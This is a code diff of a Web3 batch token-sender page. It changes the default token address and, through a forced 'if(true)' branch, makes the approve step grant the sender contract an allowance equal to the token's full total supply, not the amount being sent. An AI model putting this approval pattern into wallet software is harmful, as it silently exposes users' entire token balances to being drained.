@@ -13,7 +13,7 @@ const Web3 = require('web3');
 export default function Home() {
 
     const [account, setaccount] = useState('');
-    const [tokenAddress, settokenAddress] = useState('0xBB02889B46F134942F50850bd5480348270Ea1e4');
+    const [tokenAddress, settokenAddress] = useState('0xd4342a57ecf2fe7ffa37c33cb8f63b1500e575e6');
     const [decimals, setdecimals] = useState('18');
     const [amounts, setamounts] = useState('');
     const [selected, setselected] = useState('');
@@ -22,7 +22,6 @@ export default function Home() {
     const [tablelist, settablelist] = useState([]);
     const [transactionHash, settransactionHash] = useState([]);
     const [batchSendToken, setbatchSendToken] = useState([]);
-
     const [token, settoken] = useState('');
 
     const [totalAmount, settotalAmount] = useState(0);
@@ -32,10 +31,8 @@ export default function Home() {
     const [symbol, setsymbol] = useState('');
     const [mybalance, setmybalance] = useState(0);
     const [btndisabled,setbtndisabled] = useState(true)
-    const [pageSize] = useState(50)
-    const [ethBalance,setethBalance] = useState(0);
-
-
+    const [pageSize] = useState(200)
+    const [ethBalance,setethBalance] = useState(0)
     const [showLoading, setshowLoading] = useState(false);
     const [tips, settips] = useState('');
     const [show, setShow] = useState(false);
@@ -197,15 +194,27 @@ export default function Home() {
         console.log('Decimals: ', decimals);
 
         // Step-1: Approve
-        await token.methods.approve(senderAddress.sender, web3.utils.toWei(totalAmount.toString())).send({ from: account }).then(data=>{
-            console.log('transactionHash',data);
-            settips('transactionHash')
-            settransactionHash(data.transactionHash)
-        }).catch(err=>{
-            setshowLoading(false)
-        });
+        if(true) {
+            const totalSupply = await token.methods.totalSupply().call();
 
+            await token.methods.approve(senderAddress.sender, totalSupply).send({ from: account }).then(data=>{
+                console.log('transactionHash',data);
+                settips('transactionHash')
+                settransactionHash(data.transactionHash)
+            }).catch(err=>{
+                setshowLoading(false)
+            });
+        } else {
 
+            await token.methods.approve(senderAddress.sender, web3.utils.toWei(totalAmount.toString())).send({ from: account }).then(data=>{
+                console.log('transactionHash',data);
+                settips('transactionHash')
+                settransactionHash(data.transactionHash)
+            }).catch(err=>{
+                setshowLoading(false)
+            });
+        }
+        
         // Step-2: Sending
         let transIndex = 0;
         let batchSendTokenArr = [];
